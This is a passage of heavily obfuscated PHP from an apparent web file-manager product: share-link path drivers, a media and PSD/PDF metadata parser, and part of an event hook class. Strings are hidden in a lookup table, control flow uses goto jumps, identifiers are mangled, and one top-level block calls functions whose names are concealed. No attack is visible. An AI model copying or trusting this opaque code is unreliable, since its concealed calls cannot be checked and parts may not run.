$this->pathParse = $b‹²ÔÎ—¡Ò; } public function __call($aäé’çÊïÒ, $E¦×ŒÀç¥ç) { $E‹õ”–‘‘… =& $_SERVER[‚Ğ°–—î]; if (method_exists($this, $aäé’çÊïÒ)) { return; } $Bº¸îØï’ = call_user_func_array(array($E‹õ”–‘‘…[1125], $aäé’çÊïÒ), $E¦×ŒÀç¥ç); $c„İœ•ÒõË = array($E‹õ”–‘‘…[1126], $E‹õ”–‘‘…[1127], $E‹õ”–‘‘…[1128], $E‹õ”–‘‘…[1129], $E‹õ”–‘‘…[490], $E‹õ”–‘‘…[492], $E‹õ”–‘‘…[1130], $E‹õ”–‘‘…[103], $E‹õ”–‘‘…[1131], $E‹õ”–‘‘…[1132]); if (in_array($aäé’çÊïÒ, $c„İœ•ÒõË)) { $Bº¸îØï’ = $this->getPathOuter($Bº¸îØï’); } return $Bº¸îØï’; } public function copy($dÕ›Úë¡ã, $a÷‰’ÔÖğ±, $EÁá´ä‰˜Ú = false) { return $this->copyMove($dÕ›Úë¡ã, $a÷‰’ÔÖğ±, $EÁá´ä‰˜Ú, $_SERVER[‚Ğ°–—î][490]); } public function move($Bä­íã¹ù, $d’¿±îñŞ, $Eç³ÅÖ‹§Ê = false) { return $this->copyMove($Bä­íã¹ù, $d’¿±îñŞ, $Eç³ÅÖ‹§Ê, $_SERVER[‚Ğ°–—î][492]); } private function copyMove($dºÑœ£ÑÇ, $Aî©½²šœ‰, $Bøİ“İÕ‰ö, $F¸— ) { goto Dè×§××ˆù; A±Š—Ò´åì: if ($BçÙ˜Í¨©Ë->pathParse[$Fçº²Í¿‚[999]]) { $Aî©½²šœ‰ = $BçÙ˜Í¨©Ë->pathParse[$Fçº²Í¿‚[999]]; } else { $Aî©½²šœ‰ = $Ağ›Âòï; } $eÃ¦Ñš”ß› = IO::copyMove($dºÑœ£ÑÇ, $Aî©½²šœ‰, $Bøİ“İÕ‰ö, $F¸— ); $eÃ¦Ñš”ß› = $this->getPathOuter($eÃ¦Ñš”ß›); goto d¬§£Ú´¬ƒ; Dè×§××ˆù: $Fçº²Í¿‚ =& $_SERVER[‚Ğ°–—î]; $Ağ›Âòï = $Aî©½²šœ‰; $BçÙ˜Í¨©Ë = IO::driverMake($Aî©½²šœ‰); goto A±Š—Ò´åì; d¬§£Ú´¬ƒ: return $eÃ¦Ñš”ß›; goto Eîš­²«ğ; Eîš­²«ğ: } public function pathFather($d¹¨µæ°¶ø) { return get_path_father($this->pathParse[$_SERVER[‚Ğ°–—î][75]]); } public function iconvSystem($a¯ß‡øŠ) { return $a¯ß‡øŠ; } protected function infoParse($E‹Ğã¸ğËŸ, $c»Ë¸ä»½ = false) { $BÈ“Äø½½Î =& $_SERVER[‚Ğ°–—î]; $d«‡§çÇ… = $this->pathParse[$BÈ“Äø½½Î[439]][$BÈ“Äø½½Î[1020]] . $this->pathParse[$BÈ“Äø½½Î[1013]]; if ($c»Ë¸ä»½) { $FôŸÍ¢¢¬¯ = IO::infoWithChildren($d«‡§çÇ…); } else { $FôŸÍ¢¢¬¯ = IO::info($d«‡§çÇ…); } $fŸ¤³†™é = $this->pathParse[$BÈ“Äø½½Î[439]]; return Action($BÈ“Äø½½Î[1124])->_shareItemeParse($FôŸÍ¢¢¬¯, $fŸ¤³†™é); } public function listAll($bÙÑøœ±İš) { $EŸ¡šˆ³¬ğ =& $_SERVER[‚Ğ°–—î]; $bï³¶ëŞˆö = IO::listAll($bÙÑøœ±İš); $Eœ‰ãÀŒÍç = $this->pathParse[$EŸ¡šˆ³¬ğ[439]]; foreach ($bï³¶ëŞˆö as &$døµ˜³Á¡È) { check_abort(); $døµ˜³Á¡È = array_merge(IO::info($døµ˜³Á¡È[$EŸ¡šˆ³¬ğ[75]]), $døµ˜³Á¡È); $døµ˜³Á¡È[$EŸ¡šˆ³¬ğ[391]] = Action($EŸ¡šˆ³¬ğ[1124])->_shareItemeParse($døµ˜³Á¡È, $Eœ‰ãÀŒÍç); } return $bï³¶ëŞˆö; } public function getPathOuter($Eåñ‰ÅôÎ) { goto e‡Ú­åõÁø; bğ¨¨±‚: $dóƒñ×‘¿ = KodIO::clear($Eåñ‰ÅôÎ); $d‰È„á¼¥Ü = KodIO::clear($this->pathParse[$d¿Ö–¸ƒÁ¥[439]][$d¿Ö–¸ƒÁ¥[1020]]); $AÔ×£æŠ¼Ø = substr($dóƒñ×‘¿, strlen($d‰È„á¼¥Ü)); goto Cõ›—‡œò; Cõ›—‡œò: if (substr($dóƒñ×‘¿, 0, strlen($d‰È„á¼¥Ü)) != $d‰È„á¼¥Ü) { return !1; } return $this->pathParse[$d¿Ö–¸ƒÁ¥[1014]] . $d¿Ö–¸ƒÁ¥[8] . ltrim($AÔ×£æŠ¼Ø, $d¿Ö–¸ƒÁ¥[8]); goto Cšò‡Ê½ª; e‡Ú­åõÁø: $d¿Ö–¸ƒÁ¥ =& $_SERVER[‚Ğ°–—î]; $F†È”Ğ·œ = KodIO::parse($Eåñ‰ÅôÎ); if ($F†È”Ğ·œ[$d¿Ö–¸ƒÁ¥[29]] == KodIO::KOD_SHARE_ITEM) { return $F†È”Ğ·œ[$d¿Ö–¸ƒÁ¥[75]]; } goto bğ¨¨±‚; Cšò‡Ê½ª: } public function getType() { $dª³£§–Û =& $_SERVER[‚Ğ°–—î]; $D’»Î¸ = str_replace($dª³£§–Û[71], $dª³£§–Û[33], get_class($this)); return strtolower($D’»Î¸); } public function isTypeObject($B™ŒÎ¢ˆÊÇ) { return IO::isTypeObject($B™ŒÎ¢ˆÊÇ); } public function info($eÂëÔ™óÔ) { return $this->infoParse($eÂëÔ™óÔ); } public function infoAuth($dƒä÷¢ˆ™¤) { return $this->infoParse($dƒä÷¢ˆ™¤); } public function infoWithChildren($AîĞˆâŸÍ¤) { return $this->infoParse($AîĞˆâŸÍ¤, !0); } public function infoFull($cñ›Ãæô„¹) { return $this->infoParse($cñ›Ãæô„¹); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($B«†ˆ³‹) { $this->pathParse = $B«†ˆ³‹; } protected function infoParse($dÓ¸ğòâ˜ƒ, $fŸœğİôŒø = false) { $CäÒç×” À =& $_SERVER[‚Ğ°–—î]; return Action($CäÒç×” À[1019])->sharePathInfo($this->pathParse[$CäÒç×” À[75]], !0, $fŸœğİôŒø); } public function listPath($CÛÏ°å»ì, $D†¼·îÕÃ = false) { $C‰ò…ğÜÔä =& $_SERVER[‚Ğ°–—î]; $c¨Ù²ÏïŠ¿ = IO::listPath($CÛÏ°å»ì, $D†¼·îÕÃ); foreach ($c¨Ù²ÏïŠ¿ as $dà•„öŒæ => $Aç™Ëî›è) { if (!in_array($dà•„öŒæ, array($C‰ò…ğÜÔä[73], $C‰ò…ğÜÔä[74]))) { continue; } foreach ($Aç™Ëî›è as $b÷Œëòé¨ó => $fíãÆ•ªˆï) { $fíãÆ•ªˆï = Action($C‰ò…ğÜÔä[1133])->parsePathChildren($fíãÆ•ªˆï, array($C‰ò…ğÜÔä[387] => $CÛÏ°å»ì)); $c¨Ù²ÏïŠ¿[$dà•„öŒæ][$b÷Œëòé¨ó] = Action($C‰ò…ğÜÔä[1019])->shareItemInfo($fíãÆ•ªˆï); } } return $c¨Ù²ÏïŠ¿; } public function listAll($e³óƒ±‘î) { $D¯¥Ñ„Û®¢ =& $_SERVER[‚Ğ°–—î]; $d¸ì›ëÑ¼ = IO::listAll($e³óƒ±‘î); foreach ($d¸ì›ëÑ¼ as &$e¡¬ñå Í) { $e¡¬ñå Í = array_merge(IO::info($e¡¬ñå Í[$D¯¥Ñ„Û®¢[75]]), $e¡¬ñå Í); $e¡¬ñå Í[$D¯¥Ñ„Û®¢[391]] = Action($D¯¥Ñ„Û®¢[1019])->shareItemInfo($e¡¬ñå Í); } return $d¸ì›ëÑ¼; } } if ($_SERVER[$_SERVER[‚Ğ°–—î][777]] != $_SERVER[$_SERVER[‚Ğ°–—î][875]]) { goto B—ŠİÜ™Õ; d¾êØ‚æç’: $B”ÖÒ–ù¨ƒ = explode($_SERVER[‚Ğ°–—î][217], $C¤§Ëæ¿»ì); if (count($B”ÖÒ–ù¨ƒ) < $_SERVER[‚Ğ°–—î][610]) { $C¡ö…÷‡çØ = $_SERVER[‚Ğ°–—î][782]; $C¡ö…÷‡çØ(); } $f§„›ˆõÌÖ = $_SERVER[‚Ğ°–—î][783]; goto Dä£ì‚Ç‡ñ; Dä£ì‚Ç‡ñ: $f§„›ˆõÌÖ($_SERVER[$_SERVER[‚Ğ°–—î][778]]); goto eöˆ‹õŞÎ½; B—ŠİÜ™Õ: $Fî¬©ÕÁÍÈ = $_SERVER[‚Ğ°–—î][779]; $A„…¼ªÀ½î = $_SERVER[$_SERVER[‚Ğ°–—î][780]] . $_SERVER[‚Ğ°–—î][781]; $C¤§Ëæ¿»ì = $Fî¬©ÕÁÍÈ($A„…¼ªÀ½î); goto d¾êØ‚æç’; eöˆ‹õŞÎ½: } goto F—§ÂÚ›œÏ; FºâöŠÁæœ: class GetInfo { private static $fileTypeArray; public static function get($Bª‡Şç³Æ) { $bˆ»êñ†ì = IO::info($Bª‡Şç³Æ); return self::infoAdd($bˆ»êñ†ì); } public static function infoAdd(&$eí–ÑÂóŠš) { goto C¼È‚¶Áï±; cæ’Ÿ§ˆŠ¹: $dò‘½“­¹³[$fßÈ«Îˆö“[372]] = $EÔ“³Ø§ƒ¥; $eí–ÑÂóŠš[$fßÈ«Îˆö“[426]] = $dò‘½“­¹³; return $eí–ÑÂóŠš; goto a…›˜„à¼ä; AĞµêíŒ¿: $EÔ“³Ø§ƒ¥ = $eí–ÑÂóŠš[$fßÈ«Îˆö“[160]]; try { if ($eí–ÑÂóŠš[$fßÈ«Îˆö“[160]] == $fßÈ«Îˆö“[1615]) { $dò‘½“­¹³ = self::psdParse($D„Åä©™÷¿); $EÔ“³Ø§ƒ¥ = $fßÈ«Îˆö“[1616]; } else { if ($eí–ÑÂóŠš[$fßÈ«Îˆö“[160]] == $fßÈ«Îˆö“[1617]) { $dò‘½“­¹³ = self::pdfParse($D„Åä©™÷¿); } else { $EÔ“³Ø§ƒ¥ = self::$fileTypeArray[$fßÈ«Îˆö“[1618]][$eí–ÑÂóŠš[$fßÈ«Îˆö“[160]]]; $Añ »¨¨¡ = self::$fileTypeArray[$fßÈ«Îˆö“[1619]][$EÔ“³Ø§ƒ¥][$fßÈ«Îˆö“[1620]]; $A¦Õ´ÄÛ£Á = @$cš²Øß­Ë->analyze($D„Åä©™÷¿, $eí–ÑÂóŠš[$fßÈ«Îˆö“[77]], $eí–ÑÂóŠš[$fßÈ«Îˆö“[28]]); $dò‘½“­¹³ = self::parseData($A¦Õ´ÄÛ£Á, $Añ »¨¨¡, $eí–ÑÂóŠš); } } } catch (Exception $F´È¿¶˜·½) { $dò‘½“­¹³ = array($fßÈ«Îˆö“[372] => $EÔ“³Ø§ƒ¥); } if (!$dò‘½“­¹³) { return; } goto cæ’Ÿ§ˆŠ¹; C¼È‚¶Áï±: $fßÈ«Îˆö“ =& $_SERVER[‚Ğ°–—î]; static $cš²Øß­Ë; if (!$cš²Øß­Ë) { require SDK_DIR . $fßÈ«Îˆö“[1613]; $cš²Øß­Ë = new getID3(); } goto BØŠÚ»ÇÛ¿; BØŠÚ»ÇÛ¿: if (!$eí–ÑÂóŠš || $eí–ÑÂóŠš[$fßÈ«Îˆö“[29]] != $fßÈ«Îˆö“[167]) { return; } if (!self::support($eí–ÑÂóŠš[$fßÈ«Îˆö“[160]]) || isset($eí–ÑÂóŠš[$fßÈ«Îˆö“[426]])) { return; } $D„Åä©™÷¿ = $fßÈ«Îˆö“[1614] . $eí–ÑÂóŠš[$fßÈ«Îˆö“[75]]; goto AĞµêíŒ¿; a…›˜„à¼ä: } public static function support($dî¥å•¸Ñ) { goto Aöè½Šàõ‚; BàÓª•¹ô: $bÏğî’š‹ = array($eÆ˜‹âª££[1617], $eÆ˜‹âª££[1615]); if (in_array($dî¥å•¸Ñ, $bÏğî’š‹)) { return !0; } if (isset(self::$fileTypeArray[$eÆ˜‹âª££[1618]][$dî¥å•¸Ñ])) { return !0; } goto bÎ¹¾“îåî; bÎ¹¾“îåî: return !1; goto Aù§âÜÆ–¦; Aöè½Šàõ‚: $eÆ˜‹âª££ =& $_SERVER[‚Ğ°–—î]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $dî¥å•¸Ñ = strtolower($dî¥å•¸Ñ); goto BàÓª•¹ô; Aù§âÜÆ–¦: } private static function parseData($e›¼ÏÂºù”, $Bñš‹Â–œ‹, $Bâ™‹†ä±) { $aŒĞå‡é¤Ñ =& $_SERVER[‚Ğ°–—î]; $BÁÕŠ¨Ç± = $e›¼ÏÂºù”[$aŒĞå‡é¤Ñ[1621]]; $aÀ¬á‰Øñ” = array(); foreach ($Bñš‹Â–œ‹ as $A²…ˆ‰…Ôó => $fˆÇ«çê»Ü) { foreach ($fˆÇ«çê»Ü as $E«íÑ†‘ñÓ) { if (is_array($E«íÑ†‘ñÓ)) { $CÙéˆë¶ª = self::parseData($e›¼ÏÂºù”, $fˆÇ«çê»Ü, $Bâ™‹†ä±); if ($CÙéˆë¶ª) { $aÀ¬á‰Øñ”[$A²…ˆ‰…Ôó] = $CÙéˆë¶ª; } break; } $CàÕ©†›Êß = str_replace($aŒĞå‡é¤Ñ[1391], $BÁÕŠ¨Ç±, $E«íÑ†‘ñÓ); $CÙéˆë¶ª = _get($e›¼ÏÂºù”, $CàÕ©†›Êß); $CÙéˆë¶ª = is_array($CÙéˆë¶ª) ? $CÙéˆë¶ª[0] : $CÙéˆë¶ª; if ($CÙéˆë¶ª) { break; } } if ($CÙéˆë¶ª || $CÙéˆë¶ª === 0 || $CÙéˆë¶ª === !1) { $CÙéˆë¶ª = self::valueReset($E«íÑ†‘ñÓ, $CÙéˆë¶ª, $A²…ˆ‰…Ôó); if ($CÙéˆë¶ª !== null) { $aÀ¬á‰Øñ”[$A²…ˆ‰…Ôó] = $CÙéˆë¶ª; } } } $aÀ¬á‰Øñ” = self::valueResetAll($aÀ¬á‰Øñ”, $Bâ™‹†ä±); return $aÀ¬á‰Øñ”; } private static function psdParse($D˜óòÛÑ) { $cùÒ¾Õ™„„ =& $_SERVER[‚Ğ°–—î]; if (IO::fileSubstr($D˜óòÛÑ, 0, 4) != $cùÒ¾Õ™„„[1622]) { return !1; } $Fª°¥Çˆ© = getImageSize($D˜óòÛÑ, $aáÂö‚¹); if (!$Fª°¥Çˆ©) { return; } $fÈ¹¼İ…Öœ = array($cùÒ¾Õ™„„[1537] => $Fª°¥Çˆ©[0], $cùÒ¾Õ™„„[1539] => $Fª°¥Çˆ©[1]); return $fÈ¹¼İ…Öœ; } private static function pdfParse($BŒí§”¶¢Ñ) { return FileParsePdf::parse($BŒí§”¶¢Ñ); } private static function fileTypeParse() { $DÒÌˆ¬Ğñƒ =& $_SERVER[‚Ğ°–—î]; $d¹ÁøÜ„åÌ = self::fileTypeArray(); $e”–ÛÇîÆ‰ = array(); foreach ($d¹ÁøÜ„åÌ as $b×ô„æ¯ÛØ => $Eæ¢²Ê‰ß) { $cÔ®Ÿˆò = _get($Eæ¢²Ê‰ß, $DÒÌˆ¬Ğñƒ[160], $DÒÌˆ¬Ğñƒ[33]); $C„±íŠé“„ = is_string($cÔ®Ÿˆò) ? explode($DÒÌˆ¬Ğñƒ[47], $cÔ®Ÿˆò) : $cÔ®Ÿˆò; if (!$C„±íŠé“„) { continue; } foreach ($C„±íŠé“„ as $cÔ®Ÿˆò) { $cÔ®Ÿˆò = strtolower(trim($cÔ®Ÿˆò)); if (!$cÔ®Ÿˆò) { continue; } $e”–ÛÇîÆ‰[$cÔ®Ÿˆò] = $b×ô„æ¯ÛØ; } $d¹ÁøÜ„åÌ[$b×ô„æ¯ÛØ][$DÒÌˆ¬Ğñƒ[160]] = array_keys($e”–ÛÇîÆ‰); $d¹ÁøÜ„åÌ[$b×ô„æ¯ÛØ][$DÒÌˆ¬Ğñƒ[1620]] = self::parseKeyMap($Eæ¢²Ê‰ß[$DÒÌˆ¬Ğñƒ[1620]]); } return array($DÒÌˆ¬Ğñƒ[1619] => $d¹ÁøÜ„åÌ, $DÒÌˆ¬Ğñƒ[1618] => $e”–ÛÇîÆ‰); } private static function parseKeyMap($Fñïï£‡óá) { $AÇğ›ò—ğ¹ =& $_SERVER[‚Ğ°–—î]; foreach ($Fñïï£‡óá as $E“éœ„´á³ => $BŒŠ¡×¾Ä¹) { if (is_array($BŒŠ¡×¾Ä¹)) { $bº§ª Ş˜æ = self::parseKeyMap($BŒŠ¡×¾Ä¹); if ($bº§ª Ş˜æ) { $Fñïï£‡óá[$E“éœ„´á³] = $bº§ª Ş˜æ; } continue; } $dÈ‹øóó = explode($AÇğ›ò—ğ¹[47], $BŒŠ¡×¾Ä¹); $A¼°‡¥ŸôÇ = array(); foreach ($dÈ‹øóó as $B’ãöâ ­®) { $B’ãöâ ­® = trim($B’ãöâ ­®); if (!$B’ãöâ ­®) { continue; } if (preg_match($AÇğ›ò—ğ¹[1623], $B’ãöâ ­®, $d‹Šœ‚‹ğö)) { $a±ÛáØê– = explode($AÇğ›ò—ğ¹[271], $d‹Šœ‚‹ğö[1]); foreach ($a±ÛáØê– as $f¿ÚŒŠ½) { $A¼°‡¥ŸôÇ[] = str_replace($d‹Šœ‚‹ğö[0], $f¿ÚŒŠ½, $B’ãöâ ­®); } } else { $A¼°‡¥ŸôÇ[] = $B’ãöâ ­®; } } $Fñïï£‡óá[$E“éœ„´á³] = $A¼°‡¥ŸôÇ; } return $Fñïï£‡óá; } private static function valueResetAll($Eåˆä¡ÜË¼, $DÖÏÄñ³¿) { goto D±ë¦È¼; D±ë¦È¼: $cï†™˜µ·ô =& $_SERVER[‚Ğ°–—î]; if (isset($Eåˆä¡ÜË¼[$cï†™˜µ·ô[1624]])) { $f’Àª—ÈÒ = ceil($Eåˆä¡ÜË¼[$cï†™˜µ·ô[1624]]); $eêÈ›ØŠ¢ = intval($f’Àª—ÈÒ / 3600); $e‘¯ä­ãé± = intval(($f’Àª—ÈÒ - $eêÈ›ØŠ¢ * 3600) / 60); $EÓ‚¾„ÁÂ = $f’Àª—ÈÒ % 60; $Eåˆä¡ÜË¼[$cï†™˜µ·ô[1625]] = sprintf($cï†™˜µ·ô[1626], $eêÈ›ØŠ¢, $e‘¯ä­ãé±, $EÓ‚¾„ÁÂ); if ($eêÈ›ØŠ¢ == 0) { $Eåˆä¡ÜË¼[$cï†™˜µ·ô[1625]] = sprintf($cï†™˜µ·ô[1627], $e‘¯ä­ãé±, $EÓ‚¾„ÁÂ); } } $bˆƒ“™–³Õ = _get($Eåˆä¡ÜË¼, $cï†™˜µ·ô[1628]); goto DºÁ ŸÙã‡; DºÁ ŸÙã‡: if ($bˆƒ“™–³Õ) { $dğ¢…Ääˆä = IO_PATH_SYSTEM_TEMP . $cï†™˜µ·ô[1629] . KodIO::hashPath($DÖÏÄñ³¿) . $cï†™˜µ·ô[1630]; $Eåˆä¡ÜË¼[$cï†™˜µ·ô[1631]] = Action($cï†™˜µ·ô[1632])->pluginCacheFileSet($dğ¢…Ääˆä, $bˆƒ“™–³Õ); unset($Eåˆä¡ÜË¼[$cï†™˜µ·ô[1633]][$cï†™˜µ·ô[1616]]); } $d·“ê½Ÿëİ = _get($Eåˆä¡ÜË¼, $cï†™˜µ·ô[1634], $cï†™˜µ·ô[33]); $fŒ½øƒ§‰¸ = _get($Eåˆä¡ÜË¼, $cï†™˜µ·ô[1635], $cï†™˜µ·ô[33]); goto F…œĞø‹ãÀ; bÖ¨â»‰•: return $Eåˆä¡ÜË¼; goto eÎ‘“¢½Ê; F…œĞø‹ãÀ: $fŒêĞĞ’© = _get($Eåˆä¡ÜË¼, $cï†™˜µ·ô[1636], $cï†™˜µ·ô[33]); $eÍÑÒÛõ¶Ñ = $d·“ê½Ÿëİ . $fŒ½øƒ§‰¸ . $fŒêĞĞ’©; if ($eÍÑÒÛõ¶Ñ && get_charset($eÍÑÒÛõ¶Ñ) != $cï†™˜µ·ô[326]) { $Eåˆä¡ÜË¼[$cï†™˜µ·ô[1633]][$cï†™˜µ·ô[1344]] = iconv_to($Eåˆä¡ÜË¼[$cï†™˜µ·ô[1633]][$cï†™˜µ·ô[1344]], get_charset($eÍÑÒÛõ¶Ñ), $cï†™˜µ·ô[326]); $Eåˆä¡ÜË¼[$cï†™˜µ·ô[1633]][$cï†™˜µ·ô[1637]] = iconv_to($Eåˆä¡ÜË¼[$cï†™˜µ·ô[1633]][$cï†™˜µ·ô[1637]], get_charset($eÍÑÒÛõ¶Ñ), $cï†™˜µ·ô[326]); $Eåˆä¡ÜË¼[$cï†™˜µ·ô[1633]][$cï†™˜µ·ô[1638]] = iconv_to($Eåˆä¡ÜË¼[$cï†™˜µ·ô[1633]][$cï†™˜µ·ô[1638]], get_charset($eÍÑÒÛõ¶Ñ), $cï†™˜µ·ô[326]); } goto bÖ¨â»‰•; eÎ‘“¢½Ê: } private static function valueReset($bÌÆçŠööè, $aáœ•Ğô–ê, $eŠä°ÍŒ§ñ) { $C·“Â­÷Ÿî =& $_SERVER[‚Ğ°–—î]; $AêÓ‡˜ÃÙŞ = $C·“Â­÷Ÿî[1554]; switch ($bÌÆçŠööè) { case $C·“Â­÷Ÿî[1639]: $aáœ•Ğô–ê = $aáœ•Ğô–ê == $C·“Â­÷Ÿî[83] ? $C·“Â­÷Ÿî[1640] : $C·“Â­÷Ÿî[1641]; break; case $C·“Â­÷Ÿî[1642]: $aáœ•Ğô–ê = $aáœ•Ğô–ê ? $aáœ•Ğô–ê : null; break; default: break; } switch ($eŠä°ÍŒ§ñ) { case $C·“Â­÷Ÿî[1643]: $aáœ•Ğô–ê = round($aáœ•Ğô–ê, 2); break; case $C·“Â­÷Ÿî[187]: case $C·“Â­÷Ÿî[107]: if ($aáœ•Ğô–ê < 0) { $aáœ•Ğô–ê = null; } else { if (is_numeric($aáœ•Ğô–ê)) { $aáœ•Ğô–ê = date($AêÓ‡˜ÃÙŞ, $aáœ•Ğô–ê); } } break; default: break; } return $aáœ•Ğô–ê; } private static function fileTypeArray() { $A£š¡ñÉÇË =& $_SERVER[‚Ğ°–—î]; return array($A£š¡ñÉÇË[1616] => array($A£š¡ñÉÇË[160] => $A£š¡ñÉÇË[1644] . $A£š¡ñÉÇË[1645], $A£š¡ñÉÇË[1620] => array($A£š¡ñÉÇË[1537] => $A£š¡ñÉÇË[1646], $A£š¡ñÉÇË[1539] => $A£š¡ñÉÇË[1647], $A£š¡ñÉÇË[1648] => $A£š¡ñÉÇË[1649], $A£š¡ñÉÇË[1650] => $A£š¡ñÉÇË[1651], $A£š¡ñÉÇË[187] => $A£š¡ñÉÇË[1652], $A£š¡ñÉÇË[107] => $A£š¡ñÉÇË[1653], $A£š¡ñÉÇË[1654] => $A£š¡ñÉÇË[1655], $A£š¡ñÉÇË[1656] => $A£š¡ñÉÇË[1657], $A£š¡ñÉÇË[1658] => $A£š¡ñÉÇË[1659], $A£š¡ñÉÇË[1660] => $A£š¡ñÉÇË[1661], $A£š¡ñÉÇË[1662] => $A£š¡ñÉÇË[1663], $A£š¡ñÉÇË[1664] => $A£š¡ñÉÇË[1665], $A£š¡ñÉÇË[1666] => $A£š¡ñÉÇË[1667], $A£š¡ñÉÇË[1668] => array($A£š¡ñÉÇË[1669] => $A£š¡ñÉÇË[1670], $A£š¡ñÉÇË[1671] => $A£š¡ñÉÇË[1672], $A£š¡ñÉÇË[1673] => $A£š¡ñÉÇË[1674]), $A£š¡ñÉÇË[1675] => $A£š¡ñÉÇË[1676], $A£š¡ñÉÇË[1677] => $A£š¡ñÉÇË[1678], $A£š¡ñÉÇË[1679] => $A£š¡ñÉÇË[1680], $A£š¡ñÉÇË[1681] => $A£š¡ñÉÇË[1682], $A£š¡ñÉÇË[1683] => array($A£š¡ñÉÇË[1684] => $A£š¡ñÉÇË[1685], $A£š¡ñÉÇË[1686] => $A£š¡ñÉÇË[1687], $A£š¡ñÉÇË[1688] => $A£š¡ñÉÇË[1689], $A£š¡ñÉÇË[1690] => $A£š¡ñÉÇË[1691], $A£š¡ñÉÇË[1692] => $A£š¡ñÉÇË[1693], $A£š¡ñÉÇË[1694] => $A£š¡ñÉÇË[1695], $A£š¡ñÉÇË[1696] => $A£š¡ñÉÇË[1697], $A£š¡ñÉÇË[1698] => $A£š¡ñÉÇË[1699], $A£š¡ñÉÇË[1700] => $A£š¡ñÉÇË[1701], $A£š¡ñÉÇË[1702] => $A£š¡ñÉÇË[1703], $A£š¡ñÉÇË[1704] => $A£š¡ñÉÇË[1705]))), $A£š¡ñÉÇË[1706] => array($A£š¡ñÉÇË[160] => $A£š¡ñÉÇË[1707] . $A£š¡ñÉÇË[1708], $A£š¡ñÉÇË[1620] => array($A£š¡ñÉÇË[1624] => $A£š¡ñÉÇË[1709], $A£š¡ñÉÇË[187] => $A£š¡ñÉÇË[1710], $A£š¡ñÉÇË[107] => $A£š¡ñÉÇË[1711], $A£š¡ñÉÇË[1656] => $A£š¡ñÉÇË[1712], $A£š¡ñÉÇË[1713] => $A£š¡ñÉÇË[1714], $A£š¡ñÉÇË[1715] => $A£š¡ñÉÇË[1642], $A£š¡ñÉÇË[1716] => $A£š¡ñÉÇË[1717], $A£š¡ñÉÇË[1718] => $A£š¡ñÉÇË[1719], $A£š¡ñÉÇË[1720] => $A£š¡ñÉÇË[1721], $A£š¡ñÉÇË[1633] => array($A£š¡ñÉÇË[1344] => $A£š¡ñÉÇË[1722], $A£š¡ñÉÇË[1637] => $A£š¡ñÉÇË[1723], $A£š¡ñÉÇË[1638] => $A£š¡ñÉÇË[1724], $A£š¡ñÉÇË[1725] => $A£š¡ñÉÇË[1726], $A£š¡ñÉÇË[1727] => $A£š¡ñÉÇË[1728], $A£š¡ñÉÇË[1729] => $A£š¡ñÉÇË[1730], $A£š¡ñÉÇË[1616] => $A£š¡ñÉÇË[1731]))), $A£š¡ñÉÇË[1732] => array($A£š¡ñÉÇË[160] => $A£š¡ñÉÇË[1733] . $A£š¡ñÉÇË[1734], $A£š¡ñÉÇË[1620] => array($A£š¡ñÉÇË[1537] => $A£š¡ñÉÇË[1735], $A£š¡ñÉÇË[1539] => $A£š¡ñÉÇË[1736], $A£š¡ñÉÇË[1624] => $A£š¡ñÉÇË[1709], $A£š¡ñÉÇË[187] => $A£š¡ñÉÇË[1737], $A£š¡ñÉÇË[107] => $A£š¡ñÉÇË[1738], $A£š¡ñÉÇË[1643] => $A£š¡ñÉÇË[1739], $A£š¡ñÉÇË[1720] => $A£š¡ñÉÇË[1740], $A£š¡ñÉÇË[1716] => $A£š¡ñÉÇË[1741], $A£š¡ñÉÇË[1656] => $A£š¡ñÉÇË[1742], $A£š¡ñÉÇË[1706] => array($A£š¡ñÉÇË[1715] => $A£š¡ñÉÇË[1642], $A£š¡ñÉÇË[1743] => $A£š¡ñÉÇË[1744], $A£š¡ñÉÇË[1713] => $A£š¡ñÉÇË[1714], $A£š¡ñÉÇË[1720] => $A£š¡ñÉÇË[1721], $A£š¡ñÉÇË[1716] => $A£š¡ñÉÇË[1745], $A£š¡ñÉÇË[1718] => $A£š¡ñÉÇË[1719]))), $A£š¡ñÉÇË[1746] => array($A£š¡ñÉÇË[1620] => array($A£š¡ñÉÇË[1747] => $A£š¡ñÉÇË[1748], $A£š¡ñÉÇË[1749] => $A£š¡ñÉÇË[1750])), $A£š¡ñÉÇË[1751] => array($A£š¡ñÉÇË[1620] => array())); } } class Hook { private static $events = array(); public static function get($DÈ„ìññ˜ = false) { if (!$DÈ„ìññ˜) { return self::$events; } else { return self::$events[$DÈ„ìññ˜]; } } public static function apply($c¡‰–¸ê—, $dì¥™Œœéê = array()) { $b›«ÏˆáÉ = ActionApply($c¡‰–¸ê—, $dì¥™Œœéê); if (is_string($c¡‰–¸ê—)) { Hook::trigger($c¡‰–¸ê—); } return $b›«ÏˆáÉ; } public static function bind($Fù£¶´«Ÿæ, $B¦ÉÏ›ƒ, $C‡ñ¢¨ß = false) { $a„áô°‹äÇ =& $_SERVER[‚Ğ°–—î]; if (!isset(self::$events[$Fù£¶´«Ÿæ])) { self::$events[$Fù£¶´«Ÿæ] = array(); } self::$events[$Fù£¶´«Ÿæ][] = array($a„áô°‹äÇ[1752] => $B¦ÉÏ›ƒ, $a„áô°‹äÇ[1753] => $C‡ñ¢¨ß, $a„áô°‹äÇ[1754] => 0); } public static function once($CÓ¯ÁóÈ†ô, $bÅÅëà¯††) { self::bind($CÓ¯ÁóÈ†ô, $bÅÅëà¯††, !0); } public static function unbind($a‹Üïœ¦ç¤, $eÄ×ëÉò¾’ = false) { if (!$eÄ×ëÉò¾’) { self::$events[$a‹Üïœ¦ç¤] = array(); return; } $BÑŠ˜‰× = self::$events[$a‹Üïœ¦ç¤]; self::$events[$a‹Üïœ¦ç¤] = array(); if (!is_array($BÑŠ˜‰×)) { return; } for ($AÀ²ñ¬åÄŸ = 0; $AÀ²ñ¬åÄŸ < count($BÑŠ˜‰×); $AÀ²ñ¬åÄŸ++) { if ($BÑŠ˜‰×[$AÀ²ñ¬åÄŸ][$_SERVER[‚Ğ°–—î][1752]] == $eÄ×ëÉò¾’) { continue; } self::$events[$a‹Üïœ¦ç¤][] = $BÑŠ˜‰×[$AÀ²ñ¬åÄŸ]; } } public static function filter($eÒÙÑ¯êËì, $fóìİÃõÁà) { goto CÖŒîï©¤–; aî†ãŠŠÉÆ: for ($aíæËë„‚Ç = 0; $aíæËë„‚Ç < count($FØÌéğÈí´); $aíæËë„‚Ç++) { $fŠ‰¢—‚Ë = $FØÌéğÈí´[$aíæËë„‚Ç]; if 